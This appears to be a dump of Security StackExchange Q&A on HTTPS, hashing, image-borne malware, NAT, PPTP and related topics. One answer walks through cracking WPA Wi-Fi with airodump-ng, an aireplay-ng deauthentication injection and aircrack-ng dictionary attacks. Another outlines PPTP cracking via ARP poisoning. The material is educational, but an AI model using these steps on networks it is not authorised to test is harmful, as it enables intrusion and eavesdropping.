<p>But TCP does not guarantee any level of security. Therefore an intermediate layer named SSL is put between TCP and HTTP and you get the so called HTTPS. This way of working is called tunneling – you dump data into one end of (SSL) tunnel and collect it at the other one. SSL gets HTTP messages, encrypts them, sends them over TCP and decrypts them again at the other end. <strong>Encryption protects you from eavesdropping and transparent MITM attack (altering the messages).</strong></p>

<p>But SSL does not only provide encryption, it also provides authentication. Server must have a <strong>certificate signed by a well known certification authority (CA)</strong> that proves its identity. Without authentication, encryption is useless as MITM attack is still possible. The attacker could trick you into thinking that he is the server you want to connect to. Private chat with the devil is not what you want, you want to verify that the server you are connecting to really is the one you want to connect to. <strong>Authentication protects you from MITM.</strong></p>

<h1>Weak points</h1>

<p>So where are the weak points?</p>

<ul>
<li>Endpoints of secure connection. The transfer could be secure, but what about the server itself? Or the client? They may not.</li>
<li>Not using HTTPS. Users can be tricked into not using the scheme in various ways.</li>
<li>Untrustworthy CAs. They break the authentication part, allowing for MITM attack.</li>
<li>Weak encryption mechanism. Crypto technologies age in two ways: Serious flaws might be found in their design, leading to attacks much more efficient than brute force, or their parameters and processing power increase due to Moore's law might allow for a feasible brute-force attack.</li>
<li>Implementation of the scheme. Well, if you specify A and implement B, properties of A may not hold for B.</li>
</ul>

<h1>Direct answers</h1>

<ul>
<li><p>You seem to say that you secured the transfer (using SSL). This is not enough, the security of your server can be compromised – you should not store passwords there in plain text, use their hashed form, with salt added, …</p></li>
<li><p>SSL encrypts data both when sending and receiving. MITM attacks are possible virtually only when the attacker has certificate signed by an authority the client trusts. Unless the client is tricked into not using HTTPS, nobody can read nor modify the messages being sent.</p></li>
<li><p>GET and POST are just two methods of making HTTP request. There are several other, too. Method is just a property of HTTP request. All messages are secured, both requests and responses, regardless of HTTP method being used.</p></li>
</ul>
","53621"
"Why do we still use keys to start cars? why not passwords?","23865","","<p>Around a year ago I have asked a question about <a href=""https://security.stackexchange.com/questions/69195/why-is-something-you-know-the-weakest-factor-of-authentication"">the weakest factor of authentication</a>.</p>

<p>I have had some good answers that convinced me as I always imagined the authentication process in my head as some employee in a high security facility trying to get access to his office by entering his pin or someone trying to login into his PC by entering his password but the answers make little sense if we were talking about a vehicle.</p>

<ul>
<li>Car keys can get easily lost or stolen by a stranger you met in some pub but it's highly unlikely that you shout your password while you are sleep talking</li>
<li>It's a big hassle and an expensive process to change your car keys; Passwords are very easy to change.</li>
</ul>

<p>As you can tell from the other question, the biggest issues with passwords (according to the answers I received) were:</p>

<ul>
<li>If someone has your password, you may not be able to tell that they are actively exploiting that knowledge.</li>
<li>Passwords enable random guessing, offline dictionary search, and other attacks.</li>
</ul>

<p>Well...</p>

<ul>
<li>That's true if someone were spying on your system, but if a stranger had your car keys I don't think they would return your car and if they did, you will be able to tell that someone else had access to your car.</li>
<li>Having the car locked for 5 minutes after three failed attempts is a pretty good solution.</li>
</ul>

<p>Are you in hurry to go to work?  Get inside the house and get the master physical key; having a master physical key that overrides the password system is a good rescue solution, but not when you carry it with you all the time. Carrying the authentication secret in your head is safer than carrying it in your pocket. </p>

<p>Few other things that come to my mind which makes me wonder why I've never seen a car with a password</p>

<ul>
<li><p>You can always use your car as a getaway car in a bank robbery and you later claim that you have lost the keys and it was not you; you can't do that with a password.</p></li>
<li><p>A similar idea has been introduced by an infosec expert got turned down the other day on <a href=""https://en.wikipedia.org/wiki/Dragons%27_Den_%28UK_TV_series%29"" rel=""noreferrer"">Dragons' Den</a> even when he has invented a nice combination of a device that get attached to the car engine and a mobile app. The mobile app is superior to your physical key and you can't start the car without the app, even if you have the key.</p></li>
</ul>

<p><a href=""https://i.stack.imgur.com/vPpvS.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/vPpvS.png"" alt=""Dragons&#39; Den season 13 episode 5""></a></p>

<p><a href=""https://en.wikipedia.org/wiki/Peter_Jones_%28entrepreneur%29"" rel=""noreferrer"">Peter Jones</a> attacked the idea based on the fact that your mobile might run out of charge; the authentication system of the car would never run out of charge as it gets powered by the car battery; it's replaceable, protected and if it's down, the car is down anyway and you can't blame the authentication system.</p>
","<h2>Poor password choices</h2>

<p>The primary threat that a car lock protects against is theft of the car or of objects inside the car. Most theft is opportunistic, not targeted: go to a parking lot, try multiple cars until you find a poorly protected one. With passwords or PIN, you know that many people are going to pick <code>password</code> or <code>1234</code> or for the more paranoid their date of birth. Locking a car after failed attempts doesn't matter: the thief will just try the three most likely values on each car then move on.</p>

<p>Additionally, force-locking the car after failed attempts would be annoying if your kid starts mashing the buttons.</p>

<h2>Shoulder surfing</h2>

<p>Typing a password is vulnerable to shoulder surfing. It's hard to duplicate a physical key solely from pictures (it can be done, but only with precise enough pictures). It's impossible for an unaided human to duplicate a physical key.</p>

<p>It's easy for an unaided human to remember the PIN they've just seen somebody type. Pass by someone in a parking lot, note the PIN, see them the next day/week around the same time, profit.</p>

<h2>Loaning</h2>

<p>I can loan my car keys to someone. When they give me back the key, I can be reasonably confident that they no longer have access to my car. Sure, they might have duplicated the keys, but that requires time (if they only borrow the car for a short time, I know they haven't done it), and if I trust them enough to loan my car, I probably trust them not to copy the keys.</p>

<p>If there's a single password to open the car, then if I let someone use my car, they have access forever.</p>

<p>This can be solved by having multiple passwords to open the car, of course. But that adds another set of difficulties. One is that the key space might need to be larger: with a small key space such as a 4-digit PIN, the probability of an uninformed guess can become non-negligible with multiple valid codes. A bigger difficulty is that this requires Joe Random to do key management. Joe Random's VCR blinks 12:00 since the last power failure. (Maybe not anymore with DVR that have an Internet connection.) Joe Random understands physical tokens — if I have the object in my hand, I control it — but not password management.</p>
","97361"
"What is SHA-3 and why did we change it?","23721","","<p>On the 2nd of October NIST decided that SHA-3 is the new standard hashing algorithm, does this mean we need to stop using SHA-2 as it is not secure? </p>

<p>What is this SHA-3 anyway?</p>
","<p>The <a href=""http://en.wikipedia.org/wiki/NIST_hash_function_competition"">SHA-3</a> hash competition was an open process by which the NIST defined a new standard hash function (standard for US federal usages, but things are such that this will probably become a worldwide <em>de facto</em> standard). The process was initiated in 2007. At that time, a number of weaknesses and attacks had been found on the predecessors of the SHA-2 functions (SHA-256, SHA-512...), namely MD5 and SHA-1, so it was feared that SHA-256 would soon be ""broken"" or at least weakened. Since choosing and specifying a cryptographic primitive takes time, NIST began the SHA-3 process, with the unspoken but clearly understood intention of finding a <em>replacement</em> for SHA-2.</p>

<p>SHA-2 turned out to be more robust than expected. We do not really know why; there are some half-baked arguments (the message expansion is non-linear, the function accumulates twice as many elementary operations than SHA-1...) but there is also a suspicion that SHA-256 remained unharmed because all the researchers were busy working on the SHA-3 candidates. Anyway, with SHA-2 doom being apparently postponed indefinitely, NIST shifted its objectives, and instead of choosing a <em>replacement</em>, they defined a <em>backup plan</em>: a function which can be kept in a glass cabinet, to be used in case of emergency. Correspondingly, <em>performance</em> lost most of its relevance.</p>

<p>This highlights the choice of <a href=""http://en.wikipedia.org/wiki/Keccak"">Keccak</a>: among the competition finalists, it was the function which was most different from both SHA-2 and the AES; so it reduced the risk that all standard cryptographic algorithms be broken simultaneously, and NIST metaphorically be caught with their kilt down.</p>

<p><strong>Let's not be hasty:</strong> not only is SHA-2 still fine (both officially and scientifically), but SHA-3 is just <em>announced</em>: it will take a few more months before we can get a <em>specification</em> (although we can prepare implementations based on what was submitted for the competition). What must be done <em>now</em> (and should have been done a decade ago, really) is to prepare protocols and applications for <strong>algorithm agility</strong>, i.e. the ability to switch functions if the need arises (in the same way that SSL/TLS has ""cipher suites"").</p>
","21116"
"Can malware be attached to an image?","23707","","<p>I have a small number of employees who use a company computer but these people aren't very tech savvy. They use an email client and a messaging client.</p>

<p>I'm pretty sure they wouldn't click on .exe or .zip file in an email without thinking, and I know that's one area of concern.</p>

<p>However, I'm thinking about images. In fact, regardless of how capable a person is with technology I believe that attaching things (code or anything else) to an image can be a security risk.</p>

<p>What can be attached to images to harm another?</p>

<p>I believe that images can pose a security risk as they 'automatically execute' or something.</p>

<p>There are so many ways that images can be received by a computer (including phone or tablet of course):</p>

<pre><code>- email
- iMessage (or any other messaging app)
- someone right-clicking and saving an image from a web page
- just viewing a web page of course downloads the image to cache
</code></pre>

<p>What precautions do I need to take regarding the above four things? Can someone just attach some code to an image and it execute?</p>

<p>What do I need to do to prevent images being used against my computers?</p>

<p>I'm guessing you couldn't just attach code to an image and iMessage someone's iPhone. What about Android?</p>
","<p>The other answers mostly talk about attaching arbitrary code to images via steganographic techniques, but that's not very interesting since it requires that the user be complicit in extracting and executing that.  The user could just execute malicious code directly if that's their goal.</p>

<p>Really you're interested in whether there's a possibility of unexpected, arbitrary code execution when viewing an image.  And yes, there is such a possibility of an attacker constructing a malicious image (or something that claims to be an image) that targets specific image viewing implementations with known flaws.  For example, if an image viewer allocates a buffer and computes the necessary buffer size from a naive <code>width * height * bytes_per_pixel</code> calculation, a malicious image could report dimensions sufficiently large to cause the above calculation to overflow, then causing the viewer to allocate a smaller buffer than expected, then allowing for a buffer overflow attack when data is read into it.</p>

<p>Specific examples:</p>

<ul>
<li><a href=""http://technet.microsoft.com/en-us/security/bulletin/ms05-009"" rel=""noreferrer"">http://technet.microsoft.com/en-us/security/bulletin/ms05-009</a></li>
<li><a href=""http://technet.microsoft.com/en-us/security/bulletin/ms04-028"" rel=""noreferrer"">http://technet.microsoft.com/en-us/security/bulletin/ms04-028</a></li>
<li><a href=""http://www.adobe.com/support/security/bulletins/apsb11-22.html"" rel=""noreferrer"">http://www.adobe.com/support/security/bulletins/apsb11-22.html</a></li>
<li><a href=""https://www.mozilla.org/security/announce/2012/mfsa2012-92.html"" rel=""noreferrer"">https://www.mozilla.org/security/announce/2012/mfsa2012-92.html</a></li>
<li><a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1205"" rel=""noreferrer"">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1205</a></li>
<li><a href=""http://en.wikipedia.org/wiki/Windows_Metafile_vulnerability"" rel=""noreferrer"">http://en.wikipedia.org/wiki/Windows_Metafile_vulnerability</a></li>
</ul>

<p>In general, these sorts of things are difficult to protect against.  Some things you can do:</p>

<ul>
<li>Keep your systems and applications updated.</li>
<li>Enable <a href=""http://en.wikipedia.org/wiki/Data_Execution_Prevention"" rel=""noreferrer"">DEP</a>.</li>
<li>Enable <a href=""http://en.wikipedia.org/wiki/Address_space_layout_randomization"" rel=""noreferrer"">ASLR</a> if possible.</li>
<li>Avoid running programs with administrative privileges.</li>
<li>On Windows, <a href=""http://www.microsoft.com/emet"" rel=""noreferrer"">Microsoft's EMET</a> could also provide some protection.</li>
</ul>
","55073"
"What is the difference between ISO 27001 and ISO 27002?","23683","","<p>What is the difference between ISO 27001 and ISO 27002? Are they related to each other or not?</p>
","<p>The ISO 27000 series of standards are a compilation of international standards all related to information security. The difference is that the ISO 27001 standard has an organizational focus and details requirements against which an organization’s Information Security Management System (ISMS) can be audited. ISO 27002 on the other hand is more focused on the individual and provides a code of practice for use by individuals within an organization. If you compare them you will see that they're structured similarly and that they map to eachother. </p>

<p>The the difference is in the level of detail, ISO 27002 explains one control on one whole page, while ISO 27001 dedicates only one sentence to each control.ISO 27002 provides best practice recommendations on information security management for use by those who are responsible for implementing or maintaining the Information Security Management Systems (ISMS). Whereas ISO 27001 defines the audit requirements.</p>
","76067"
"Should I allow browsers to remember my passwords and synchronize them?","23676","","<p>I wonder, how wise is it to allow Chrome and Firefox to a) remember the passwords b) synchronize them? My gut tells me that if it's not man in the middle who can intercept them, but Google and Mozilla themselves can see them on their servers or with help of their browsers. Of course, they say they won't and the passwords are stored encrypted, but can we know that for sure? Maybe the browsers themselves secretly send the passwords to Google and Mozilla. </p>

<p>I've just begun using keepass recently, therefore at least I have a place where my passwords are stored locally, because previously I  stored them only in the  browsers and synchronized. And now I think I shouldn't  synchronize them anymore.</p>
","<p>To expand on what @d1str0 said: if the creator of your browser wanted to steal your passwords, it would be trivial to send them to a manufacturer controlled server whenever you entered them - they don't need to bother with the hassle of telling you about sync procedures, or offering to remember passwords. All browsers by default send a certain level of usage data back, usually crash reports and update checks, which could easily conceal password and username data.</p>

<p>However, if any browser was found to be doing this, there would be outcry against that manufacturer - look at the rage directed at Microsoft following the release of Windows 10 with the reporting back enabled there.</p>

<p><a href=""http://keepass.info/"">Keepass</a> and <a href=""https://www.pwsafe.net/"">Password Safe</a> are both open source (so, given sufficient programming knowledge, and a trusted compiler, you can be sure they're doing what they say they are, and nothing else - sufficient programming knowledge may well be a very high level though). In both cases, the encrypted password files should be safe to sync, even to third party sources, as long as the safe password is not provided. Breaking AES (Keepass) or TwoFish (Password Safe) without the appropriate key (the safe password) comes down, as far as we know, to brute force.</p>

<p><a href=""https://lastpass.com/"">Lastpass</a> and <a href=""https://agilebits.com/onepassword"">1Password</a> both require you to trust the developers, and sync by default to a remote location. Theoretically, they are safe, but there wouldn't be any obvious way to detect a vulnerability in them relating to storage. If you're concerned about Chrome or Firefox stealing passwords, logically, the same arguments apply to these apps.</p>

<p>Personally, I use one of the cloud based password services mentioned - I've considered the risks and benefits, and balanced the amount of security I'm willing to accept against the ease of use for the service, and decided that for my use cases, it's acceptable. Your acceptable risk might well be different - if you consider AES as vulnerable, for example, keeping a Keepass safe on an encrypted USB key which uses a different encryption algorithm might be a viable option, but uploading the file to a third party service might be ""too risky"" for you.</p>

<p>It comes down to what you consider safe, having evaluated the options. Many security professionals have considered this problem though, and generally advise using password safe type software over allowing browsers to remember passwords, simply because browsers used to be terrible at it - they allowed access without a master password, and used poor encryption methods. Some of these issues have been addressed now, but old habits die hard!</p>
","116897"
"No handshake recorded from airodump-ng","23610","","<p>I've just started to attempt this by following the guide from <a href=""http://lewiscomputerhowto.blogspot.co.uk/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html"" rel=""nofollow"">lewiscomputerhowto</a>. I've seen other people ask similar questions, but they all seem to be older threads. The steps I've taken are shown below. </p>

<pre><code>// Disconnect from all wireless networks.
sudo airmon-ng
// This will show all devices available for monitor
sudo airmon-ng start wlan0mon
// Should state that your wireless device has monitor mode enabled)
// if not use the following steps
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
// end of troubleshoot
sudo airodump-ng wlan0
// Identify desired network from the ESSID. Copy the BSSID of target.
sudo airodump-ng -c 6 --bssid AP_MAC -w /home/luke/Desktop/airodump/ wlan0
// Identify bssid and associate which is marked under station
sudo aireplay-ng –0 2 –a AP_MAC –c CLIENT_MAC wlan0
</code></pre>

<p>This results in this feedback without mentioning a handshake has been recorded.</p>

<pre><code>21:22:43  Waiting for beacon frame (BSSID: AP_MAC) on channel 6
21:22:44  Sending 64 directed DeAuth. STMAC: [CLIENT_MAC] [ 4|10 ACKs]
21:22:45  Sending 64 directed DeAuth. STMAC: [CLIENT_MAC] [ 1|11 ACKs]
</code></pre>

<p>Am I doing this incorrectly, or any advice on how this can be accomplished.</p>
","<ol>
<li>Use a wireless sniffer or protocol analyzer (WireShark or airmon-ng) to capture wireless packets. Sniffing this way is similar to how attackers sniff wired networks to eavesdrop and capture information sent across a network.</li>
<li>Wait for a wireless client to authenticate. WPA wireless clients authenticate with WAPs using a four-way handshake where they exchange information. Essentially, the client needs to prove to the WAP that it knows the passphrase. However, the client doesn’t send the passphrase in cleartext. Instead, the four-way handshake allows the client to encrypt the passphrase in such a way that the WAP can decrypt it and verify that the client has the correct passphrase.</li>
<li>Use a brute force attack. Once attackers have the encrypted passphrase from the captured four-way handshake, they can launch an offline brute force attack. Automated tools such as Aircrack-ng compare the encrypted password in the capture against passwords in one or more password files. When successful, it gives the attacker the actual passphrase used by the WLAN.</li>
</ol>

<p>The first thing we need to do is to turn our network adapter (wifi network adapter) into monitor mode, this will enable us to see wireless beacons sent across the airwaves even though it’s not actually associated with any access point.</p>

<p>Now, to know what is the adapter we have just type ‘iwconfig’ on the terminal. The image below shows us that we have wlan1 as our wifi adapter. There’s no associations as of now.
<a href=""https://i.stack.imgur.com/26grX.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/26grX.png"" alt=""1""></a></p>

<p>To make wlan1 as our monitor mode we execute this command on the terminal ‘airmon-ng start wlan1’ (refer to the image below)
<a href=""https://i.stack.imgur.com/KkNiI.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/KkNiI.png"" alt=""enter image description here""></a>
Check it if it is now on monitor mode. ‘iwconfig’
<a href=""https://i.stack.imgur.com/gKSbS.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/gKSbS.png"" alt=""enter image description here""></a>
Now, we’re going to dump all the SSIDs found by our monitoring adapter. We use ‘airodump-ng mon0’, what this does it will look for those SSIDs that are being broadcast and dump those information on our terminal.
<a href=""https://i.stack.imgur.com/ZZBYD.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/ZZBYD.png"" alt=""enter image description here""></a>
Sample Output:
<a href=""https://i.stack.imgur.com/AK8w4.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/AK8w4.png"" alt=""enter image description here""></a>
Look for the ENC tab and see if there are WPA encryption.</p>

<p>Note: WPA2 is more stronger than WPA and it might take years to crack those things.</p>

<p>Look for your targeted Wi-Fi.</p>

<p>Do this code below.</p>

<p><a href=""https://i.stack.imgur.com/RsGZ6.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/RsGZ6.png"" alt=""enter image description here""></a>
-c -> this one is for the channel (in this case it’s 1)</p>

<p>-w -> write (in our case we dump it to wpa2 file)</p>

<p>–bssid -> our target’s bssid</p>

<p>mon0 -> monitor adapter</p>

<p>Now that we have completed the 1st step (Sniffing). We’ll proceed to the 2nd step (Wait for a wireless client to authenticate).</p>

<p>Well, there’s an automated way to do that otherwise you’ll just be waiting for a miracle.</p>

<p>We use ‘aireplay-ng’ which is an injection attack. This forces a re-authentication packet into the wire.</p>

<p><a href=""https://i.stack.imgur.com/Bv1x8.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/Bv1x8.png"" alt=""enter image description here""></a>
‘aireplay-ng -0 10 -a [BSSID’s MAC Address] -c [Client’s MAC Address] mon0 [optional]’</p>

<p>-0 10 -> it’s going to try 10 times; 0 it will not limit the deauthentication attempts</p>

<p>-a -> BSSID’s MAC Address (Wi-Fi)</p>

<p>-c -> Client’s Mac Address (You may find this one on a packet capture -> Wireshark.) If you know someone’s MAC you can try it just make sure it’s associated with the AP, or if you can’t it’s ok, it’s just more effective if you have a Client’s MAC.</p>

<p>mon0 – monitor adapter.</p>

<p>Wait for a ‘WPA Handshake’ to pop up on our airodump.</p>

<p><a href=""https://i.stack.imgur.com/I7FSs.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/I7FSs.png"" alt=""enter image description here""></a>
Notice it? on the upper right corner of the image? Yeah!  Now, cancel all the dump and deauth, we’re ready to CRACK!</p>

<p>Now, navigate your way to the file we written earlier, the ‘wpa2’ one.</p>

<p><a href=""https://i.stack.imgur.com/izQBV.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/izQBV.png"" alt=""enter image description here""></a>
See the highlighted one?</p>

<p>Now we will run ‘aircrack-ng’ against the dump file we gathered earlier.</p>

<p><a href=""https://i.stack.imgur.com/t5WuF.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/t5WuF.png"" alt=""enter image description here""></a>
‘wpa2-01.cap’-> is the file</p>

<p>-w -> this is going to point to our passwords file (A Dictionary of Passwords).</p>

<p>Now press Enter.</p>

<p>This is step 3 people (Use a brute force attack.). We’re trying to crack the password now. It runs through the dictionary for a match.</p>

<p>Sample Output:
<a href=""https://i.stack.imgur.com/R4XTZ.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/R4XTZ.png"" alt=""enter image description here""></a></p>
","111571"
"How did Google know I looked something up?","23607","","<p>Yesterday I was searching <strong>DuckDuckGo</strong> for booking a vacation. I ended up reading a lot on one specific website. Today multiple websites show me Google banners from this specific website. Normally, I never look up websites for booking a vacation. I use DuckDuckGo on purpose, to prevent these kind of things. My question therefore is: how is this possible?</p>

<p>I'm 100% certain that I didn't accidentally Google something.</p>

<p>The website I was reading was <a href=""http://djoser.nl"" rel=""noreferrer"">this</a>, if that helps.</p>
","<p>Loading that page loads</p>

<pre><code>https://www.googleadservices.com/pagead/conversion.js
https://www.googletagmanager.com/gtm.js?id=GTM-WPPRGM
https://stats.g.doubleclick.net/dc.js
</code></pre>

<p>The reason Google can track you is that the website shares details of your visit with them - in this case via loading Google JavaScript code for their ads service.</p>

<p>*To expand on this -</p>

<p>The Google ad code will use a cookie to track you. But even if it didn't there are browser fingerprinting mechanisms which in most cases can correctly identify a user's machine even after a full browser cache / history clear.</p>

<p>When you visit a site with ads a request is made to the ad providers server. This sends the ID associated with you to say ""an ad on [x website] for [user y] is available. The ad providers nowadays often then real-time auction off the slot in 1/100th of a second - where potential advertisers computers can bid for the advert space.</p>

<p>The site you visited is djoser. Since djoser knows you looked at products on their site yesterday they know there is a reasonable chance you are considering buying something from them. So when you visit another site somewhere else, the ad slot on that other site is more valuable to djoser, and they bid higher than anyone else - hence why you keep seeing them.</p>
","171056"
"How to get MAC addresses of devices which are not in the network","23491","","<p>Can I get MAC addresses of devices (mobile phones) which are near to my network but not connected to it? (Linux)</p>

<p>I have been trying to get the MAC addresses of devices connected to my network through <code>nmap</code> command... but how can I get devices which are not connected to my network?</p>
","<p>If it's not in the same network, you most likely won't be able to. </p>

<p>MAC addresses are hardware addresses and are usually hidden behind a router unless you are on the same network or have direct access to the device. In other words, once you leave the network, unless the device(s) in question is/are directly connected to a router you will get the MAC address of the switch rather than the individual devices when querying that network.</p>

<p>Depending on the security of your network, you may not even be able to get the MAC addresses of devices on the same switch since they may be on different VLANs. </p>

<p>With that said, in your comment you asked if you could get any other information on the device(s). Without access to the network that the device is on it's pretty difficult to get any information on anything other than that of the router. Without getting too technical, unless the device has its own static IP address that you know, which is unlikely for a mobile device, if you query the network from the outside you'll get the public IP of the router, not the devices. Specifically for mobile phones, you can probably get information via Bluetooth if it's enabled on the device, but you have to be in close proximity. According to one commenter it may also be possible to sniff the device's traffic given close enough proximity. There are probably ways to gather more info, but it's probably more trouble than it's worth. </p>

<p>The easiest way to get information on a device on a different network is to simply join that network. </p>

<p>Edit: As you say in another comment, you have a WiFi adapter that someone can connect to. If the device doesn't connect to that adapter, then you can't gather any information about the device. But if the device does connect to your WiFi adapter, if it's assigning IP addresses, you will be able to see both the MAC address and the IP address you assigned, and with the MAC address you can infer roughly what kind of device it is based off the manufacturer's portion of the MAC address. If you're letting the device access the Internet, you will also be able to see all of the packets it sends through your adapter. You <em>may</em> be able to get some additional information specifically about the device, but it depends on the device, your WiFi adapter, the software you're using... and so on, which means there are many variables. </p>
","53963"
"Are there any known vulnerabilities in PPTP VPNs when configured properly?","23476","","<p>PPTP is the only VPN protocol supported by some devices (for example, the Asus RT-AC66U WiFi router). If PPTP is configured to only use the most secure options, does its use present any security vulnerabilities?</p>

<p>The most secure configuration of PPTP is to exclusively use:</p>

<ul>
<li>MPPE-128 encryption (which uses RC4 encryption with a 128bit key)</li>
<li>MS-CHAPv2 authentication (which uses SHA-1)</li>
<li>strong passwords (minimum 128 bits of entropy)</li>
</ul>

<p>I realize that RC4 and SHA-1 have weaknesses, but I am interested in practical impact. Are there known attacks or exploits that would succeed against a PPTP VPN with the above configuration?</p>
","<p>Yes. The protocol itself is no longer secure, as cracking the initial MS-CHAPv2 authentication can be reduced to the difficulty of cracking a single DES 56-bit key, which with current computers can be brute-forced in a very short time (making a strong password largely irrelevant to the security of PPTP as the entire 56-bit keyspace can be searched within practical time constraints).</p>

<p>The attacker can do a MITM to capture the handshake (and any PPTP traffic after that), do an offline crack of the handshake and derive the RC4 key. Then, the attacker will be able to decrypt and analyse the traffic carried in the PPTP VPN. PPTP does not provide forward secrecy, so just cracking one PPTP session is sufficient to crack all previous PPTP sessions using the same credentials.</p>

<p>Additionally, PPTP provides weak protection to the integrity of the data being tunneled. The RC4 cipher, while providing encryption, does not verify the integrity of the data as it is not an Authenticated Encryption with Associated Data (AEAD) cipher. PPTP also doesn't do additional integrity checks on its traffic (such as HMAC), and is hence vulnerable to bit-flipping attacks, ie. the attacker can modify PPTP packets with little possibility of detection. Various discovered attacks on the RC4 cipher (such as the Royal Holloway attack) make RC4 a bad choice for securing large amounts of transmitted data, and VPNs are a prime candidate for such attacks as they by nature usually transmit sensitive and large amounts of data.</p>

<p><em>If you want to, you can actually try cracking a PPTP session yourself. For a Wi-Fi user, it involves ARP poisoning your target such that the target sends the MSCHAPv2 handshake through you (which you can capture with Wireshark or any other packet capture tool). You can then crack the handshake with tools like Chap2Asleap, or if you have a few hundred dollars to spare submit the captured handshake to online cracking services. The recovered username, hash, password and encryption keys can then be used to impersonate logins to the VPN as that user, or to retroactively decrypt the target's traffic. Obviously, <strong>please do not do this without proper authorisation and outside a controlled environment</strong>.</em></p>

<p>In short, please avoid using PPTP where possible.</p>

<p>For more information, see <a href=""http://www.computerworld.com/s/article/9229757/Tools_released_at_Defcon_can_crack_widely_used_PPTP_encryption_in_under_a_day"" rel=""nofollow noreferrer"">http://www.computerworld.com/s/article/9229757/Tools_released_at_Defcon_can_crack_widely_used_PPTP_encryption_in_under_a_day</a> and <a href=""https://security.stackexchange.com/questions/29460/how-can-i-tell-if-a-pptp-tunnel-is-secure"">How can I tell if a PPTP tunnel is secure?</a>.</p>

<p>Issues discovered with RC4 (resulting in real world security issues in protocols like TLS) can be found in
<a href=""http://www.isg.rhul.ac.uk/tls/RC4mustdie.html"" rel=""nofollow noreferrer"">http://www.isg.rhul.ac.uk/tls/RC4mustdie.html</a> and <a href=""https://www.rc4nomore.com/"" rel=""nofollow noreferrer"">https://www.rc4nomore.com/</a></p>

<p>For the cracking portion, refer to
<a href=""https://www.rastating.com/cracking-pptp-ms-chapv2-with-chapcrack-cloudcracker/"" rel=""nofollow noreferrer"">https://www.rastating.com/cracking-pptp-ms-chapv2-with-chapcrack-cloudcracker/</a> and <a href=""https://samsclass.info/124/proj14/p10-pptp.htm"" rel=""nofollow noreferrer"">https://samsclass.info/124/proj14/p10-pptp.htm</a>.</p>
","45510"
"How important is NAT as a security layer?","23470","","<p>I've signed on to help a department move buildings and upgrade their dated infrastructure. This department has about 40 employees, 25 desktops, an old Novell server, and a handful of laboratory processing machines with attached systems. At the old location, this department had two networks - a LAN with no outside access whatsoever on an entirely separate switch, and a few machines with outside access. </p>

<p>We are trying to modernize this setup a bit as pretty much every user needs to access email and the time tracking system. </p>

<p>The parent organization (~10k employees) has a large IT department that is in charge of the connection and phone system at the new offsite location. The IT dept. had uverse dropped in and setup a VPN to their central network. Each desktop needs to be registered in the IT dept's system/website to get a (static) IP Address. Each IP Address given is outside accessible on any port that has a service listening on the client machine. </p>

<p>The server has confidential (HIPPA) data on it, the desktops have mapped network drives to access (some) of this data. There is also a client/server LIS in place. </p>

<p>My question is this: Is it worth making a stink that all of these machines are outside accessible? </p>

<p>Should we:</p>

<ul>
<li>Request NAT to abstract the outside from the inside, as well as a firewall that blocks all traffic not explicitly defined as allowed? If so, what argument's can I make for NAT/firewall that outweigh the benefits of them having each machine registered in their system? I would be relaying all IT related requests from the end users to the IT department in either case - so it doesn't seem very necessary to have them tied down to specific addresses in their system. Most importantly, it sounds like a nightmare to manage separate firewalls on every desktop (varying platforms/generations) and on the server. </li>
<li>Request the IT dept. block all incoming traffic to each wan accessible IP on whatever existing firewalls they have in place</li>
<li>Keep the departments LAN completely isolated from the internet. Users must share dedicated machines for accessing email, internet, and time tracking system. </li>
</ul>

<p>Thanks in advance for any comments or advice on this. </p>
","<p>NAT and firewalling are completely orthogonal concepts that have nothing to do with each other. Because <em>some</em> NAT implementations accidentally provide <em>some</em> firewalling, there is a persistent myth that NAT provides security. It provides <em>no</em> security whatsoever. None. Zero.</p>

<p>For example, a perfectly reasonable NAT implementation might, if it only had one client, forward all inbound TCP and UDP packets to that one client. The net effect would be precisely the same as if the client had the outside address of the NAT device.</p>

<p>Don't think that because most NAT devices have some firewalling built in by design or do some by accident that this means NAT itself provides any security. It is the firewalling that provides the security, not the NAT. The purpose of NAT is to make things work.</p>

<p>You must not assume a machine is not outside accessible just because it's behind a NAT device. It's not outside accessible if some device is specifically configured not to permit it to be accessed from the outside, whether that device does NAT or not.</p>

<p>Every machine having an outside address but with a stateful firewall that's properly configured, managed, and monitored is <em>vastly</em> superior to a cheap SoHo NAT box.</p>

<p>Many actual SoHo NAT boxes forward traffic to inside hosts despite no inside host having ever sent traffic to the source of the forwarded traffic. Permissive NAT does really exist.</p>
","8773"
"Is it possible to prove a certain email has been sent using a certain computer?","23467","","<p>I can understand that an SMS can be traced to the mobile phone which it has originated from and the phone owner has no chance in court but to claim that someone else has used his phone but what about an email from a PC?</p>

<p>Most emails are being sent using a browser and a web interface let alone the fact that you hardly find a PC outside a NAT. Add to that most laptops are connected via WiFi.</p>

<p>It seems very easy to claim that I have not sent email <strong>X</strong> and email address <strong>Y</strong> is not mine. IP address? it means nothing, I am sharing it with lots of people, it might be my wife who sent that email from her laptop or it might be my neighbors who hacked my WiFi.</p>

<p>How can an expert defeat such claims in court in front of a judge?   </p>
","<p>Experts are experts. What an expert says stands in court as long as:</p>

<ul>
<li>He is an expert.</li>
<li>The other party cannot provide another expert, who says that the first expert is wrong, and says it in a more convincingly expertish way.</li>
</ul>

<p>In practice, a email will be reputed to have been sent from a given PC if the <em>context</em> makes it a lot more plausible than any alternative explanation. Context elements include IP addresses registered from the SMTP server side, ease (or lack thereof) to assume that IP address on the client side (WiFi or not WiFi, accessible wires...), presence or absence of log files on the PC... and, more often than not, whether the purported sender admits to the deed or not.</p>

